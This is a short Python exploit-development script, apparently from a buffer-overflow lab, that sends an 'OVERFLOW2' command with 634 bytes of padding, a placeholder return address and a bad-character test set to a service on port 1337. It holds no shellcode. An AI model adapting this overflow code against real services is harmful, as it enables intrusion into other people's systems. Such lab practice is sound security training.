#!/usr/bin/python

import sys,socket


IP="10.10.238.44"
port=1337
SRP_offset = 634
ESP = b"BBBB"

def create_badchars():
        badchars = [0x00, 0x23, 0x3c, 0x83, 0xba]
        badchar_test = bytes(c for c in range(256) if c not in badchars)

        with open("badchar_test.bin", "wb") as f:
              f.write(badchar_test)

        return badchar_test



payload = create_badchars()

buff = b"OVERFLOW2 "                 #Prefix
buff += ("A" * SRP_offset).encode()  #Padding
buff += ESP                          #ESP points here  
buff += payload                      #Payload                              
buff += b"\r\n"                      #Postfix


try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send ((buff))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
